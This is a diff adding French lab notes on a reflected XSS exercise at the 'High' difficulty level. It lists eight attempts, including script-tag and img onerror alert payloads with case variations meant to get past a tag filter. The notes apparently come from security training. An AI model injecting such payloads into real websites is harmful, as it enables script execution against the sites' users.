@@ -79,4 +79,13 @@ while(true){
 
 ## XSS Reflected High
 
-- 
+- tentative 1 : Alain
+- tentative 2 : <h1>title</h1> => ok ça marche => XSS
+- tentative 3 : <script>alert('virus')</script> => ça ne marche plus 
+    - => medium avant d'afficher le contenu du champ saisie, le script va supprimer la balise <script>
+    - 
+- tentative 4 : <SCRIPT>alert('virus')</SCRIPT>
+- tentative 5 : <img src="xxx" onerror="alert('virus')">
+- tentative 6 : <IMG src="xxx" onerror="alert('virus')">
+- tentative 7 : <Img src="xxx" onerror="alert('virus')">
+- tentative 8 : <Img  onerror="alert('virus')" src="xxx" >
